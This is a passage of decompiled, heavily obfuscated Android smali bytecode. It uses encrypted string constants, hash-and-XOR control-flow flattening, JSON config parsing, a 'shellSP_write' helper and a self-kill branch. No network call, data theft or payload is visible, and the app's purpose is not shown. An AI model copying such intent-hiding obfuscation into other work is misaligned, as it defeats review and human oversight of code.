    invoke-static {v2, v5}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v6, v2}, Lorg/json/JSONObject;->optJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v8

    const v5, 0x4c6c38b9    # 6.1924068E7f

    const-string v2, "\u06eb\u06db\u06e0\u06d7\u06d7\u06e0\u06db\u06dc\u06d8\u06d8\u06e7\u06e6\u06ec\u06df\u06d8\u06d7\u06e4\u06d8\u06dc\u06e4\u06df\u06e6\u06e7\u06da\u06e6\u06d8\u06df\u06df\u06d6\u06e0\u06e6\u06d6\u06d8\u06d6\u06db\u06d6\u06e0\u06e4\u06e1\u06d6\u06d6\u06e1\u06d8\u06eb\u06e0\u06d8\u06d8\u06df\u06d7\u06e6\u06d8\u06d7\u06d6\u06dc\u06d8\u06da\u06e1\u06e7\u06d8\u06e6\u06df\u06d9"

    :goto_27
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I
    :try_end_15
    .catch Ljava/lang/Exception; {:try_start_15 .. :try_end_15} :catch_5

    move-result v9

    xor-int/2addr v9, v5

    sparse-switch v9, :sswitch_data_18

    goto :goto_27

    :sswitch_52
    :try_start_16
    sput-object v6, Landroidx/base/저장;->b:Lorg/json/JSONObject;

    const-string v2, "gGCrc8k=\n"

    const-string v4, "5AXJBq6FqZo=\n"

    invoke-static {v2, v4}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const/4 v4, 0x0

    invoke-virtual {v6, v2, v4}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result v2

    sput-boolean v2, Landroidx/base/저장;->c:Z

    const-string v2, "vJoV2luwrmi3gB3NWZS+\n"

    const-string v4, "3vZ0uTDxzRw=\n"

    invoke-static {v2, v4}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v6, v2}, Lorg/json/JSONObject;->optJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v5

    const v4, 0x26164a07

    const-string v2, "\u06e4\u06da\u06dc\u06d8\u06d9\u06e6\u06d6\u06d8\u06e6\u06da\u06e8\u06d8\u06dc\u06eb\u06e8\u06e0\u06e1\u06e6\u06d9\u06e6\u06e6\u06e7\u06d6\u06e5\u06d8\u06e1\u06dc\u06d9\u06d6\u06e2\u06e7\u06db\u06db\u06e7"

    :goto_28
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I
    :try_end_16
    .catch Ljava/lang/Exception; {:try_start_16 .. :try_end_16} :catch_7

    move-result v7

    xor-int/2addr v7, v4

    sparse-switch v7, :sswitch_data_19

    goto :goto_28

    :sswitch_53
    const-string v2, "\u06d8\u06da\u06e1\u06d8\u06d8\u06d7\u06e8\u06d8\u06e8\u06d6\u06d6\u06d8\u06d9\u06d6\u06d6\u06dc\u06e0\u06d8\u06d7\u06e0\u06dc\u06e1\u06ec\u06e6\u06df\u06dc\u06da\u06db\u06e5\u06db\u06d7\u06e1\u06e0\u06e2\u06e6\u06d8\u06d9\u06e8\u06df\u06e5\u06d8\u06e4\u06d6\u06da\u06d8\u06d8\u06e8\u06e0\u06e6\u06ec\u06d9\u06e7\u06e5\u06d9\u06d8\u06d8\u06d9\u06da\u06d8"

    goto :goto_28

    :sswitch_54
    :try_start_17
    const-string v2, "\u06e5\u06e2\u06e1\u06d8\u06eb\u06db\u06d9\u06e5\u06e4\u06d8\u06e0\u06ec\u06d8\u06d8\u06e0\u06db\u06db\u06e5\u06df\u06e2\u06e5\u06e5\u06e6\u06d8\u06e0\u06e7\u06dc\u06d8\u06d9\u06dc\u06e1\u06df\u06e6\u06da\u06e7\u06db\u06d7\u06e7\u06dc\u06d8"

    goto/16 :goto_24

    :sswitch_55
    const v8, 0x5e07d434

    const-string v2, "\u06e6\u06eb\u06e0\u06eb\u06e8\u06dc\u06df\u06e8\u06e5\u06db\u06e1\u06da\u06da\u06df\u06ec\u06e6\u06dc\u06e5\u06d8\u06e1\u06e0\u06ec\u06e1\u06e5\u06da\u06d7\u06e8\u06e7\u06e2\u06db\u06df\u06e1\u06da\u06df\u06df\u06d8"

    :goto_29
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v10

    xor-int/2addr v10, v8

    sparse-switch v10, :sswitch_data_1a

    goto :goto_29

    :sswitch_56
    const-string v2, "\u06db\u06e7\u06e5\u06d8\u06e2\u06ec\u06e5\u06d8\u06e1\u06e5\u06d8\u06d8\u06e1\u06e6\u06da\u06e4\u06dc\u06e1\u06d8\u06e8\u06db\u06e1\u06d6\u06e1\u06e5\u06d8\u06d8\u06e1\u06e0\u06d9\u06e2\u06e4\u06df\u06e5\u06e2\u06dc\u06da\u06eb\u06ec\u06e5\u06db\u06e5\u06eb\u06e4\u06d9\u06da\u06e0\u06e6\u06eb\u06d7\u06d7\u06e4\u06e2\u06dc\u06dc\u06d8\u06eb\u06e5\u06e6"

    goto :goto_29

    :cond_a
    const-string v2, "\u06d7\u06d9\u06d6\u06e1\u06d9\u06e7\u06da\u06d8\u06e6\u06e2\u06d8\u06e1\u06dc\u06d8\u06d8\u06e7\u06e0\u06e5\u06d8\u06db\u06dc\u06d6\u06d8\u06db\u06d7\u06df\u06d6\u06dc\u06eb\u06d8\u06db\u06df"

    goto :goto_29

    :sswitch_57
    if-eqz v4, :cond_a

    const-string v2, "\u06e0\u06eb\u06e8\u06d7\u06da\u06e6\u06d8\u06ec\u06d7\u06e6\u06d8\u06dc\u06e7\u06e1\u06d8\u06e4\u06d7\u06e8\u06d8\u06dc\u06df\u06e5\u06da\u06e8\u06e7\u06e4\u06d8\u06df\u06da\u06d9\u06e1\u06d8\u06db\u06db\u06d6\u06d7\u06db\u06e4\u06e2\u06df\u06d6\u06e4\u06eb\u06e4\u06d6\u06d6\u06d6\u06d8\u06e5\u06e5\u06e7\u06d8\u06db\u06e7\u06e5"

    goto :goto_29

    :sswitch_58
    const-string v2, "\u06e0\u06df\u06da\u06e8\u06d7\u06e8\u06e7\u06d9\u06e7\u06eb\u06e5\u06d8\u06e5\u06db\u06ec\u06eb\u06df\u06e1\u06e7\u06dc\u06e2\u06e1\u06d7\u06dc\u06e7\u06df\u06e7\u06e5\u06d7\u06db\u06d9\u06dc\u06e0\u06df\u06e6\u06db\u06e7\u06db\u06d8\u06d8\u06eb\u06e2\u06eb\u06d7\u06d6\u06d6\u06d8\u06ec\u06e2\u06d9"
    :try_end_17
    .catch Ljava/lang/Exception; {:try_start_17 .. :try_end_17} :catch_5

    goto/16 :goto_24

    :sswitch_59
    const-string v2, "\u06df\u06eb\u06e0\u06eb\u06ec\u06e2\u06e1\u06e4\u06e1\u06df\u06ec\u06e8\u06d8\u06d6\u06e1\u06dc\u06e1\u06d6\u06d8\u06d8\u06dc\u06e1\u06e7\u06df\u06e2\u06d6\u06e5\u06db\u06eb\u06e7\u06ec\u06d6\u06e6\u06eb\u06e0\u06e2\u06e6"

    goto/16 :goto_24

    :sswitch_5a
    :try_start_18
    sget-object v2, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v4, "Pi2kC16YYMxbZKlAB6YMrn85\n"

    const-string v5, "1oMU7uEeiUk=\n"

    invoke-static {v4, v5}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    const-string v2, "1Bi4wFFn\n"

    const-string v4, "t3fWpjgAJsQ=\n"

    invoke-static {v2, v4}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const/4 v4, 0x0

    move-object/from16 v0, p3

    invoke-static {v0, v2, v4}, LKvrUY/RiiGL/Utils;->shellSP_write(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_25

    :catch_5
    move-exception v2

    goto/16 :goto_1f

    :sswitch_5b
    const-string v2, "\u06d8\u06da\u06e4\u06e8\u06d9\u06db\u06e2\u06dc\u06d8\u06d6\u06e0\u06eb\u06e0\u06d6\u06e1\u06da\u06dc\u06e8\u06d8\u06df\u06e0\u06df\u06e4\u06e4\u06e8\u06d8\u06d9\u06eb\u06d6\u06ec\u06df\u06e1\u06d8\u06d7\u06d9\u06eb\u06e8\u06da\u06d6\u06db\u06df\u06d9\u06ec\u06e0\u06df"

    goto/16 :goto_26

    :sswitch_5c
    const v8, 0x19b3fc3f

    const-string v2, "\u06da\u06e5\u06d8\u06d8\u06db\u06dc\u06e6\u06e0\u06e6\u06e1\u06d8\u06e7\u06dc\u06dc\u06d8\u06d7\u06e1\u06e6\u06d6\u06d7\u06e2\u06d7\u06e5\u06d7\u06d6\u06d9\u06e0\u06d9\u06d6\u06e6\u06e8\u06d9\u06e8\u06d8\u06e4\u06d9\u06e7\u06d9\u06ec\u06e8"

    :goto_2a
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v9

    xor-int/2addr v9, v8

    sparse-switch v9, :sswitch_data_1b

    goto :goto_2a

    :sswitch_5d
    if-eqz v4, :cond_b

    const-string v2, "\u06d9\u06da\u06d6\u06d8\u06e6\u06e8\u06e1\u06dc\u06d6\u06e4\u06d9\u06e6\u06d8\u06e0\u06eb\u06d6\u06d9\u06e7\u06e8\u06d8\u06e4\u06e7\u06e2\u06e6\u06d8\u06d6\u06d8\u06df\u06d8\u06d7\u06df\u06e4\u06e1\u06d8\u06e0\u06e5\u06e6\u06ec\u06d8\u06d8\u06d8\u06d8\u06d9\u06d9\u06e1\u06e7\u06e4\u06e6\u06d8\u06e4\u06e2\u06df\u06ec\u06dc\u06e5\u06d8\u06dc\u06d6\u06df"

    goto :goto_2a

    :cond_b
    const-string v2, "\u06e1\u06e6\u06dc\u06d8\u06e6\u06d7\u06e6\u06e2\u06e5\u06d8\u06db\u06d7\u06d6\u06d9\u06e1\u06e6\u06d8\u06db\u06e2\u06e1\u06d8\u06e6\u06d8\u06e8\u06d8\u06e5\u06e6\u06e5\u06e6\u06df\u06db\u06e5\u06d8\u06e4\u06e8\u06da\u06ec\u06ec\u06da\u06d8"

    goto :goto_2a

    :sswitch_5e
    const-string v2, "\u06d8\u06eb\u06eb\u06e1\u06da\u06df\u06db\u06db\u06eb\u06eb\u06d9\u06da\u06d7\u06d6\u06e1\u06e8\u06e5\u06d8\u06da\u06e8\u06d7\u06e4\u06ec\u06da\u06ec\u06d8\u06da\u06e4\u06e7\u06e1\u06e6\u06d7\u06d7\u06e7\u06dc\u06e7\u06d8\u06e1\u06d8\u06da\u06d9\u06d6\u06d8\u06d6\u06df\u06d6\u06e5\u06d7\u06e5"

    goto :goto_2a

    :sswitch_5f
    const-string v2, "\u06df\u06e0\u06d7\u06e5\u06d7\u06e0\u06e8\u06e8\u06e0\u06ec\u06e1\u06dc\u06d8\u06d6\u06e4\u06e2\u06d9\u06ec\u06d6\u06d8\u06d7\u06e1\u06d8\u06e0\u06e1\u06d7\u06e8\u06e5\u06eb\u06d6\u06e0\u06dc\u06e0\u06d9\u06d6\u06e2\u06e1\u06eb"
    :try_end_18
    .catch Ljava/lang/Exception; {:try_start_18 .. :try_end_18} :catch_5

    goto/16 :goto_26

    :sswitch_60
    const-string v2, "\u06e1\u06e5\u06e8\u06d8\u06eb\u06d7\u06e6\u06da\u06d8\u06d8\u06e0\u06da\u06e7\u06e8\u06d9\u06d8\u06eb\u06e5\u06eb\u06d9\u06da\u06e8\u06d9\u06d8\u06e8\u06e7\u06ec\u06da\u06e2\u06d8\u06d8\u06e2\u06ec\u06e5\u06d8\u06d9\u06e7\u06e6\u06d8\u06d8\u06e5\u06e2\u06e2\u06da\u06e6"

    goto/16 :goto_26

    :sswitch_61
    :try_start_19
    invoke-static {}, Landroid/os/Process;->myPid()I

    move-result v2

    invoke-static {v2}, Landroid/os/Process;->killProcess(I)V
    :try_end_19
    .catch Ljava/lang/Exception; {:try_start_19 .. :try_end_19} :catch_4

    :goto_2b
    :sswitch_62
    return-void

    :sswitch_63
    :try_start_1a
    const-string v2, "\u06ec\u06e0\u06e0\u06d6\u06ec\u06df\u06e5\u06e4\u06e4\u06d9\u06e6\u06e6\u06e6\u06da\u06d8\u06e4\u06e1\u06d7\u06d7\u06e6\u06e5\u06d8\u06d8\u06d6\u06d6\u06d8\u06e1\u06dc\u06e1\u06d8\u06e2\u06df\u06d9\u06dc\u06d9\u06dc\u06ec\u06e5\u06d8\u06eb\u06eb\u06df\u06dc\u06e5\u06df"

    goto/16 :goto_27

    :sswitch_64
    const v9, -0x1709a132

    const-string v2, "\u06dc\u06db\u06db\u06e5\u06d9\u06d6\u06d8\u06d7\u06d8\u06d8\u06db\u06db\u06e2\u06eb\u06e5\u06d9\u06da\u06eb\u06ec\u06d7\u06e8\u06d8\u06e6\u06eb\u06e2\u06dc\u06e0\u06dc\u06d8\u06da\u06d8\u06db\u06df\u06da\u06ec\u06e6\u06d7\u06d6\u06db\u06da\u06e1\u06d6\u06d6\u06d8\u06ec\u06e7\u06d9\u06e1\u06dc\u06ec"

    :goto_2c
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v10

    xor-int/2addr v10, v9

    sparse-switch v10, :sswitch_data_1c

    goto :goto_2c

    :sswitch_65
    if-eqz v4, :cond_c

    const-string v2, "\u06d6\u06d7\u06d8\u06dc\u06e2\u06d8\u06d8\u06ec\u06d7\u06e8\u06d8\u06e7\u06db\u06d6\u06d8\u06da\u06d8\u06d8\u06da\u06df\u06dc\u06e8\u06d7\u06d6\u06e0\u06e6\u06ec\u06e6\u06dc\u06e6\u06e6\u06ec\u06d6"

    goto :goto_2c

    :cond_c
    const-string v2, "\u06ec\u06d7\u06e0\u06e8\u06e2\u06e1\u06d8\u06dc\u06dc\u06e1\u06d8\u06df\u06e8\u06d8\u06db\u06dc\u06e2\u06ec\u06e5\u06d6\u06d9\u06d9\u06d6\u06df\u06df\u06db\u06dc\u06e0\u06e8\u06d8\u06d8\u06e5\u06d8\u06e4\u06e2\u06d7\u06e8\u06e2\u06eb\u06dc\u06d9\u06e7\u06e7\u06db\u06e8\u06d8\u06e2\u06e1\u06e8\u06e4\u06e0\u06db\u06da\u06e7\u06dc\u06e6\u06e7\u06e1\u06d8"

    goto :goto_2c

    :sswitch_66
    const-string v2, "\u06d6\u06d6\u06e7\u06d8\u06d8\u06ec\u06e8\u06e6\u06db\u06e7\u06d7\u06e2\u06eb\u06e8\u06e8\u06e7\u06e1\u06d7\u06df\u06e7\u06da\u06e6\u06e6\u06e0\u06db\u06db\u06d9\u06e2\u06e2\u06e2\u06d6\u06d8"

    goto :goto_2c

    :sswitch_67
    const-string v2, "\u06eb\u06da\u06e8\u06ec\u06d6\u06d8\u06d8\u06d9\u06e1\u06eb\u06e7\u06d7\u06e7\u06d7\u06db\u06d6\u06d6\u06e7\u06db\u06e4\u06d7\u06e6\u06e0\u06ec\u06d6\u06e7\u06dc\u06e7\u06d8\u06e8\u06e7\u06e1\u06d9\u06eb\u06e4\u06d9\u06e4\u06e0\u06eb\u06d7\u06e5\u06d8\u06db\u06e0\u06d8\u06eb\u06df\u06e6\u06e7\u06e5\u06e1\u06d8"
    :try_end_1a
    .catch Ljava/lang/Exception; {:try_start_1a .. :try_end_1a} :catch_5

    goto/16 :goto_27

    :sswitch_68
    const-string v2, "\u06d7\u06d9\u06d9\u06dc\u06df\u06e7\u06d6\u06ec\u06d8\u06e6\u06d9\u06e6\u06d8\u06e2\u06df\u06d8\u06d7\u06d7\u06e5\u06d7\u06d9\u06ec\u06dc\u06e0\u06d6\u06e8\u06d8\u06d8\u06e8\u06e6\u06e5\u06e5\u06dc\u06e7\u06d8\u06ec\u06e6\u06e1\u06d9\u06da\u06eb\u06d8\u06ec\u06db"

    goto/16 :goto_27

    :sswitch_69
    const v4, 0x3e0b361c

    const-string v2, "\u06e2\u06e2\u06e5\u06d8\u06dc\u06da\u06d9\u06dc\u06d7\u06d6\u06d8\u06ec\u06e2\u06dc\u06d8\u06df\u06e6\u06d8\u06e7\u06dc\u06e6\u06e2\u06e2\u06e8\u06d8\u06e7\u06da\u06dc\u06d8\u06d7\u06d8\u06e8\u06d8\u06e6\u06da\u06e8\u06d8"

    :goto_2d
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_1d

    goto :goto_2d

    :sswitch_6a
    const-string v2, "\u06e5\u06dc\u06e4\u06e6\u06e7\u06e1\u06d8\u06e7\u06d8\u06eb\u06e4\u06df\u06e5\u06d8\u06d8\u06e8\u06e1\u06d6\u06e7\u06e8\u06d8\u06e5\u06e0\u06e4\u06d8\u06e2\u06d6\u06d6\u06e6\u06e5\u06db\u06d8\u06e7\u06d8\u06e0\u06d6\u06e6\u06e5\u06d7\u06ec\u06d7\u06e5\u06e1\u06dc\u06e1\u06d6\u06d8"

    goto :goto_2d

    :sswitch_6b
    const-string v2, "\u06e1\u06dc\u06dc\u06d8\u06d9\u06e0\u06e0\u06da\u06da\u06db\u06d6\u06df\u06e1\u06e6\u06e6\u06d8\u06d8\u06ec\u06d7\u06e2\u06e4\u06d6\u06eb\u06df\u06d6\u06eb\u06e7\u06e5\u06d7\u06df\u06e7\u06d8\u06d8\u06e4\u06e4\u06e8\u06db\u06d8\u06e1\u06d8\u06e2\u06d7\u06e4\u06ec\u06e0\u06e8\u06d8"

    goto :goto_2d

    :sswitch_6c
    const v5, 0x172a3a74

    const-string v2, "\u06e4\u06e2\u06d6\u06d8\u06da\u06d9\u06e4\u06d9\u06e6\u06e1\u06d8\u06d7\u06d8\u06d6\u06d8\u06e4\u06db\u06d9\u06e0\u06da\u06e4\u06e1\u06d6\u06e7\u06d8\u06e5\u06d7\u06db\u06e7\u06d6\u06db\u06ec\u06e0\u06d6"

    :goto_2e
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v9

    xor-int/2addr v9, v5

    sparse-switch v9, :sswitch_data_1e

    goto :goto_2e

    :sswitch_6d
    const-string v2, "\u06e1\u06d9\u06e0\u06df\u06dc\u06e1\u06e5\u06e8\u06e5\u06d8\u06e8\u06e4\u06e4\u06d8\u06e8\u06d8\u06e1\u06d6\u06da\u06da\u06e0\u06d6\u06e7\u06d8\u06d8\u06e7\u06d6\u06df\u06e8\u06e2\u06e1\u06d8\u06d6\u06e7\u06e6\u06d8\u06e7\u06da\u06e7\u06db\u06e6\u06d8\u06df\u06e0\u06d9\u06da\u06e6\u06d9\u06eb\u06ec\u06db\u06e2\u06d9\u06e8\u06da\u06ec\u06dc\u06d8"

    goto :goto_2d

    :cond_d
    const-string v2, "\u06e5\u06da\u06e6\u06df\u06eb\u06d6\u06d8\u06e6\u06db\u06df\u06ec\u06d9\u06da\u06db\u06e4\u06df\u06d9\u06e8\u06e6\u06d8\u06e6\u06e8\u06e8\u06d8\u06e2\u06e5\u06e1\u06d8\u06df\u06d8\u06d8\u06e4\u06eb\u06d6\u06d8\u06ec\u06e0\u06d8\u06d8\u06ec\u06db\u06e6\u06df\u06e5\u06d8\u06ec\u06eb\u06e1\u06d8\u06e4\u06eb\u06ec\u06ec\u06da\u06db\u06e8\u06e8\u06d8\u06d8\u06e8\u06e2\u06e5"

    goto :goto_2e

    :sswitch_6e
    if-eqz v8, :cond_d

    const-string v2, "\u06e5\u06eb\u06dc\u06d8\u06d6\u06d7\u06ec\u06df\u06ec\u06e6\u06da\u06e6\u06da\u06e5\u06e4\u06eb\u06e1\u06eb\u06da\u06db\u06e2\u06eb\u06e1\u06d7\u06d6\u06d8\u06d9\u06e7\u06dc\u06d8\u06e7\u06e2\u06e6"

    goto :goto_2e

    :sswitch_6f
    const-string v2, "\u06e2\u06d8\u06e8\u06e8\u06e0\u06d9\u06e4\u06df\u06e8\u06d8\u06df\u06df\u06d6\u06d8\u06d6\u06e6\u06e0\u06df\u06e7\u06e1\u06da\u06e1\u06d9\u06d6\u06db\u06db\u06d6\u06e7\u06d8\u06eb\u06d9\u06dc\u06db\u06e2\u06e5\u06d8\u06db\u06e5\u06e8"

    goto :goto_2e

    :sswitch_70
    const v4, -0x7b3a20f0

    :try_start_1b
    const-string v2, "\u06df\u06df\u06e2\u06d8\u06d7\u06d9\u06d9\u06d8\u06df\u06ec\u06da\u06d6\u06da\u06d8\u06d7\u06e6\u06e4\u06d7\u06e0\u06e7\u06dc\u06e8\u06e6\u06db\u06da\u06e6\u06e0\u06d8\u06d8\u06dc\u06d8\u06d6\u06d9\u06d7\u06d7\u06e0\u06d6\u06dc\u06d7\u06e5\u06d8\u06d6\u06e2\u06d8\u06d8\u06e2\u06da\u06e6\u06d8\u06d6\u06dc\u06da\u06e0\u06e6\u06e2\u06e0\u06e0\u06e5\u06d8"

    :goto_2f
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_1f

    goto :goto_2f

    :sswitch_71
    const/4 v2, 0x0

    move v5, v2

    :goto_30
    const v4, -0x397f464

    const-string v2, "\u06e5\u06dc\u06dc\u06e5\u06da\u06eb\u06e0\u06ec\u06e5\u06d8\u06e2\u06df\u06d6\u06d8\u06d7\u06e1\u06da\u06d6\u06da\u06df\u06ec\u06ec\u06ec\u06d9\u06d7\u06dc\u06da\u06db\u06d8\u06da\u06e8"

    :goto_31
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v9

    xor-int/2addr v9, v4

    sparse-switch v9, :sswitch_data_20

    goto :goto_31

    :sswitch_72
    const v9, -0x769d1c7

    const-string v2, "\u06e2\u06d6\u06d7\u06e5\u06d6\u06e6\u06d8\u06e6\u06da\u06d7\u06d7\u06e5\u06e6\u06d8\u06d9\u06e2\u06eb\u06d6\u06e5\u06e7\u06d8\u06e8\u06d9\u06eb\u06e8\u06ec\u06db\u06e5\u06e6\u06dc\u06d8\u06db\u06e2\u06df\u06dc\u06db\u06db\u06e1\u06e4\u06df\u06e8\u06d8\u06d9\u06dc\u06e6\u06e4"

    :goto_32
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v10

    xor-int/2addr v10, v9

    sparse-switch v10, :sswitch_data_21

    goto :goto_32

    :sswitch_73
    const-string v2, "\u06da\u06dc\u06e4\u06e6\u06db\u06d6\u06ec\u06d9\u06e1\u06d8\u06d6\u06d6\u06e2\u06d8\u06db\u06e4\u06e2\u06d8\u06d6\u06d8\u06d6\u06d6\u06dc\u06d9\u06db\u06dc\u06df\u06e7\u06dc\u06d9\u06ec\u06d6\u06da\u06d8\u06eb\u06e6\u06e8\u06e1\u06d8\u06e1\u06e1\u06e7\u06d8\u06d8\u06d6\u06db"

    goto :goto_31

    :sswitch_74
    const-string v2, "\u06e5\u06ec\u06eb\u06d9\u06e5\u06e1\u06d8\u06e1\u06da\u06ec\u06d9\u06e6\u06da\u06e4\u06e6\u06e8\u06d8\u06d8\u06ec\u06e0\u06eb\u06e7\u06e8\u06d8\u06e4\u06db\u06e1\u06e8\u06df\u06e5\u06df\u06da\u06eb"

    goto :goto_2f

    :sswitch_75
    const v5, -0x12ab0809

    const-string v2, "\u06dc\u06df\u06e6\u06d8\u06e0\u06e7\u06d7\u06db\u06da\u06e4\u06d7\u06df\u06d9\u06d6\u06d9\u06d8\u06eb\u06df\u06e1\u06eb\u06ec\u06df\u06e5\u06e1\u06d8\u06e8\u06df\u06e6\u06d8\u06e8\u06e7\u06e5\u06e2\u06db\u06e8\u06d8\u06da\u06e4\u06ec\u06eb\u06e7\u06dc\u06e7\u06e1\u06d8\u06e0\u06d6\u06e8\u06d8\u06d6\u06ec\u06db\u06da\u06d8\u06da\u06dc\u06d8\u06d9"

    :goto_33
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v9

    xor-int/2addr v9, v5

    sparse-switch v9, :sswitch_data_22

    goto :goto_33

    :sswitch_76
    invoke-virtual {v8}, Lorg/json/JSONArray;->length()I

    move-result v2

    if-lez v2, :cond_e

    const-string v2, "\u06e6\u06d8\u06da\u06da\u06e2\u06e8\u06d8\u06df\u06e2\u06dc\u06d8\u06e6\u06da\u06d7\u06df\u06df\u06e1\u06da\u06e6\u06d6\u06d8\u06e5\u06e2\u06e8\u06eb\u06e8\u06e2\u06e2\u06df\u06e2\u06d7\u06d9\u06e1\u06d8"

    goto :goto_33

    :cond_e
    const-string v2, "\u06e5\u06e8\u06e4\u06e5\u06df\u06da\u06dc\u06dc\u06da\u06d6\u06da\u06e0\u06e5\u06e2\u06dc\u06e1\u06eb\u06d9\u06e8\u06d8\u06dc\u06eb\u06d8\u06e5\u06d8\u06e0\u06dc\u06e1\u06eb\u06d6\u06e1\u06ec\u06df\u06eb\u06e0\u06e7\u06e8\u06e7\u06e6\u06e4\u06e2\u06e8\u06d8\u06eb\u06d8\u06dc\u06e7\u06eb\u06e5\u06d8\u06e5\u06d6\u06df\u06e1\u06e7\u06ec"

    goto :goto_33

    :sswitch_77
    const-string v2, "\u06e0\u06d8\u06d9\u06e0\u06e2\u06e8\u06d8\u06da\u06ec\u06e0\u06d6\u06e4\u06e5\u06d8\u06da\u06dc\u06db\u06dc\u06e1\u06d9\u06e8\u06d8\u06e6\u06da\u06e0\u06d9\u06e6\u06e1\u06d8\u06d9\u06df\u06e1\u06d8\u06eb\u06d7\u06d6\u06e6\u06db\u06e5\u06eb\u06d7\u06e4\u06d6\u06e1"

    goto :goto_33

    :sswitch_78
    const-string v2, "\u06e4\u06d9\u06df\u06eb\u06d9\u06e5\u06d8\u06d6\u06d9\u06e8\u06e1\u06e8\u06d8\u06d8\u06e2\u06dc\u06e1\u06d8\u06eb\u06d6\u06d7\u06e6\u06d9\u06d9\u06e1\u06d8\u06e7\u06d9\u06e2\u06df\u06d8\u06e0\u06ec\u06d9\u06e1\u06e1\u06ec\u06ec\u06d7\u06e5\u06e8\u06d8\u06ec\u06e7\u06df"

    goto :goto_2f

    :sswitch_79
    const-string v2, "\u06e6\u06e7\u06e1\u06d8\u06d9\u06df\u06df\u06e5\u06eb\u06e8\u06d8\u06db\u06d7\u06dc\u06d7\u06d8\u06e5\u06e7\u06e0\u06dc\u06da\u06e6\u06e5\u06e1\u06e5\u06dc\u06d8\u06d7\u06e5\u06e8\u06e5\u06e5\u06db\u06e2\u06e7\u06eb\u06eb\u06eb\u06e1\u06d8\u06e2\u06e2\u06df\u06e6\u06e5\u06da\u06e7\u06dc\u06df\u06ec\u06da\u06e4"

    goto :goto_2f

    :cond_f
    const-string v2, "\u06da\u06e4\u06e0\u06e6\u06d6\u06e5\u06e1\u06d9\u06df\u06e1\u06da\u06e8\u06d8\u06e0\u06eb\u06e6\u06d8\u06d8\u06ec\u06e5\u06e4\u06eb\u06e7\u06da\u06e6\u06d8\u06e4\u06e5\u06e6\u06d6\u06e5\u06ec\u06db\u06e6\u06e4\u06e4\u06db\u06e6\u06df\u06e0\u06df\u06dc\u06e2\u06e2\u06e2\u06e7\u06e1"

    goto :goto_32

    :sswitch_7a
    invoke-virtual {v8}, Lorg/json/JSONArray;->length()I

    move-result v2

    if-ge v5, v2, :cond_f

    const-string v2, "\u06d7\u06e8\u06df\u06da\u06d9\u06da\u06dc\u06e1\u06ec\u06e7\u06df\u06d7\u06e6\u06eb\u06da\u06d8\u06e1\u06d8\u06ec\u06e7\u06e1\u06d8\u06e7\u06d8\u06ec\u06d6\u06df\u06e8\u06e8\u06d9\u06df\u06dc\u06e0\u06d6\u06d8\u06da\u06d7\u06e8"

    goto :goto_32

    :sswitch_7b
    const-string v2, "\u06d8\u06e6\u06e0\u06e5\u06eb\u06e8\u06d8\u06d9\u06db\u06df\u06d8\u06df\u06e0\u06d9\u06e5\u06df\u06ec\u06e5\u06e6\u06e6\u06d9\u06e6\u06d8\u06df\u06d9\u06d8\u06d8\u06d6\u06da\u06e5\u06d9\u06dc\u06d9\u06ec\u06da\u06eb\u06e1\u06eb\u06e7\u06dc\u06d9\u06da\u06db\u06e5\u06e7\u06d8"

    goto :goto_32

    :sswitch_7c
    const-string v2, "\u06e6\u06e1\u06e7\u06d8\u06db\u06d7\u06e6\u06d8\u06e1\u06e0\u06dc\u06d8\u06d7\u06df\u06e6\u06e4\u06d8\u06eb\u06d7\u06e0\u06e5\u06e1\u06df\u06e7\u06e0\u06d7\u06e2\u06e5\u06d6\u06dc\u06e6\u06d9\u06d9\u06e1\u06eb\u06d7\u06d8\u06d8\u06d9"

    goto :goto_31

    :sswitch_7d
    const-string v2, "\u06ec\u06d6\u06df\u06d6\u06d8\u06e0\u06e6\u06e7\u06e1\u06d8\u06d9\u06eb\u06d6\u06d8\u06d9\u06db\u06d7\u06e0\u06e7\u06e0\u06e7\u06df\u06e8\u06d8\u06d6\u06df\u06e4\u06e2\u06da\u06e2\u06e1\u06e8\u06e5\u06e6\u06d8\u06d9\u06d8\u06eb\u06e1\u06ec\u06d6\u06d8\u06e4\u06d8\u06dc\u06d8\u06da\u06d8\u06dc\u06e8\u06d8\u06e7\u06d8\u06e0\u06dc\u06da\u06e6\u06e1\u06e6"

    goto :goto_31

    :sswitch_7e
    invoke-virtual {v8, v5}, Lorg/json/JSONArray;->optJSONObject(I)Lorg/json/JSONObject;

    move-result-object v4

    const v9, 0x2d073396

